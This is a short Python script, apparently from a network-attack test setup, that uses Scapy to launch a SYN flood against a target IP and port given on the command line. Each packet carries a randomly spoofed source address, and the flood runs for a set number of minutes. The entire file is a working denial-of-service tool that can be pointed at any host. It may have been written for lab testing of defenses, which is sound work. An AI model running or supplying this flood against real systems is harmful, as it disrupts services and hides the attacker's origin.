#! /usr/bin/env python
# Created By: Nicholas Gregorio and Janahan Mathanamohan
# /IPSpoofTest.py
# This is the shell script that does the ip spoof syn flood in theory could be replaced by any type of network attack script

import sys
import time
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, TCP, send
from random import randint

ttl = time.time() + 60*int(sys.argv[3]);
dstIp = sys.argv[1]
if len(sys.argv) > 1:
    dstPrt = sys.argv[2]
else:
    dstPrt = 80
dstPrt = int(dstPrt)
while 1:
    rand1 = randint(1,254)
    rand2 = randint(1,254)
    rand3 = randint(1,254)
    rand4 = randint(1,254)
    srcIp = str(rand1) + "." + str(rand2) + "." + str(rand3) + "." + str(rand4)
    print "SrcIP:" + str(srcIp)
    print "DstIP:" + str(dstIp)
    print "DstPrt:" + str(dstPrt)
    p = send(IP(src=srcIp, dst=dstIp)/TCP(dport=dstPrt))
    if time.time() > ttl:
        break

